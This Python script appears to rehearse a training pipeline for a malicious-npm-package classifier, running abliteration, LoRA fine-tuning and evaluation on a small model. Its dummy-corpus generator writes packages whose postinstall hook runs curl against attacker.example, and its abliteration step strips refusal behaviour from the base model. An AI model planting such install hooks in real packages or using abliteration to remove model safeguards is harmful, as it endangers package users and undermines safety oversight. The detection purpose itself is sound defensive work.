"""Cheap end-to-end rehearsal on a small base model.

Runs abliteration -> SFT -> eval on a 1-2B model so the workflow can be
validated on a single GPU in about thirty minutes before the H100 burn.
Use this BEFORE running the full GLM 32B / DeepSeek 70B pipeline.

Usage:
    python -m apiary_train.rehearsal --base-model Qwen/Qwen2.5-Coder-1.5B --quick
"""

from __future__ import annotations

import argparse
import json
import logging
import sys
import tempfile
from pathlib import Path
from typing import Sequence

logger = logging.getLogger("apiary.rehearsal")


def _build_arg_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="Apiary training pipeline rehearsal")
    p.add_argument("--base-model", default="Qwen/Qwen2.5-Coder-1.5B")
    p.add_argument("--workdir", type=Path, default=None, help="Defaults to a temp dir")
    p.add_argument("--figshare-archive", type=Path, default=None)
    p.add_argument("--synthetic-dir", type=Path, default=None)
    p.add_argument("--quick", action="store_true", help="Use tiny sample sizes for fast smoke test")
    p.add_argument("--epochs", type=int, default=1)
    p.add_argument("--max-len", type=int, default=2048)
    p.add_argument("--skip-abliteration", action="store_true")
    p.add_argument("--skip-train", action="store_true")
    p.add_argument("--skip-eval", action="store_true")
    p.add_argument("-v", "--verbose", action="store_true")
    return p


def _generate_dummy_corpus(out_dir: Path, n: int = 20) -> Path:
    """Write a tiny synthetic-style manifest + package dirs.

    Used when no real corpus is supplied so the rehearsal still runs.
    """
    out_dir.mkdir(parents=True, exist_ok=True)
    manifest_path = out_dir / "manifest.jsonl"
    lines: list[str] = []
    for i in range(n):
        label = "malicious" if i % 2 == 0 else "clean"
        pkg_name = f"rehearsal-pkg-{i:03d}"
        pkg_dir = out_dir / pkg_name
        pkg_dir.mkdir(exist_ok=True)
        pj = {
            "name": pkg_name,
            "version": "0.0.1",
            "scripts": (
                {"postinstall": "node postinstall.js"} if label == "malicious" else {"test": "echo ok"}
            ),
        }
        (pkg_dir / "package.json").write_text(json.dumps(pj, indent=2), encoding="utf-8")
        body = (
            "const cp = require('child_process'); cp.execSync('curl http://attacker.example/x');\n"
            if label == "malicious"
            else "console.log('hello from " + pkg_name + "');\n"
        )
        (pkg_dir / ("postinstall.js" if label == "malicious" else "index.js")).write_text(body, encoding="utf-8")
        lines.append(json.dumps({
            "name": pkg_name,
            "version": "0.0.1",
            "label": label,
            "package_path": pkg_name,
        }))
    manifest_path.write_text("\n".join(lines), encoding="utf-8")
    return out_dir


def main(argv: Sequence[str] | None = None) -> int:
    args = _build_arg_parser().parse_args(argv)
    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="%(asctime)s %(levelname)s %(name)s %(message)s",
    )

    workdir = args.workdir or Path(tempfile.mkdtemp(prefix="apiary_rehearsal_"))
    workdir.mkdir(parents=True, exist_ok=True)
    logger.info("rehearsal workdir: %s", workdir)

    # Step 0: build a corpus if none provided
    synthetic_dir = args.synthetic_dir
    if synthetic_dir is None and args.figshare_archive is None:
        synthetic_dir = _generate_dummy_corpus(workdir / "dummy_synth", n=20 if args.quick else 100)
        logger.info("generated dummy synthetic corpus at %s", synthetic_dir)

    # Step 1: data prep
    from apiary_train.data_prep import (
        iter_figshare_packages,
        iter_synthetic_packages,
        prepare_sft_dataset,
    )

    records = []
    if args.figshare_archive:
        cap = 50 if args.quick else None
        records.extend(iter_figshare_packages(args.figshare_archive, max_packages=cap))
    if synthetic_dir:
        cap = 50 if args.quick else None
        records.extend(iter_synthetic_packages(synthetic_dir, max_packages=cap))
    sft_path = workdir / "sft_rehearsal.jsonl"
    stats = prepare_sft_dataset(records, sft_path, max_len_tokens=args.max_len, split_test_frac=0.2)
    logger.info("data prep done: %s", {k: v for k, v in stats.items() if k != "token_lengths"})

    # Step 2: abliteration
    abliterated_path = workdir / "model_abliterated"
    if not args.skip_abliteration:
        try:
            from apiary_train.abliteration import abliterate, load_prompt_pair

            harmful_path = Path(__file__).parent / "harmful_prompts.json"
            harmless_path = Path(__file__).parent / "harmless_prompts.json"
            harmful, harmless = load_prompt_pair(harmful_path, harmless_path)
            if args.quick:
                harmful = harmful[:20]
                harmless = harmless[:20]
            abliterate(
                base_model=args.base_model,
                out_dir=abliterated_path,
                harmful_prompts=harmful,
                harmless_prompts=harmless,
                layer_idx=None,
            )
            logger.info("abliteration done: %s", abliterated_path)
        except Exception as exc:
            logger.exception("abliteration failed; will SFT against base model: %s", exc)
            abliterated_path = None

    # Step 3: SFT
    sft_out = workdir / "model_sft"
    if not args.skip_train:
        from apiary_train.sft_lora import SftConfig, train

        cfg = SftConfig(
            base_model=args.base_model,
            abliterated_model=abliterated_path,
            train_data=sft_path,
            output=sft_out,
            batch_size=1,
            grad_accum=4,
            epochs=args.epochs,
            lr=2e-4,
            lora_r=16,
            lora_alpha=32,
            max_seq_len=args.max_len,
            save_steps=50,
            eval_steps=50,
            logging_steps=5,
        )
        try:
            train(cfg)
            logger.info("SFT done: %s", sft_out)
        except Exception as exc:
            logger.exception("SFT failed: %s", exc)
            return 2

    # Step 4: eval
    if not args.skip_eval:
        from apiary_train.eval import evaluate

        test_path = sft_path.with_suffix(".test.jsonl")
        try:
            metrics = evaluate(
                model_path=str(sft_out),
                test_data=test_path,
                output_dir=sft_out / "eval",
                base_model=args.base_model,
                max_records=20 if args.quick else None,
                max_new_tokens=256 if args.quick else 512,
            )
            logger.info("eval done: %s", metrics)
        except Exception as exc:
            logger.exception("eval failed: %s", exc)
            return 3

    print(json.dumps({"workdir": str(workdir), "ok": True}, indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
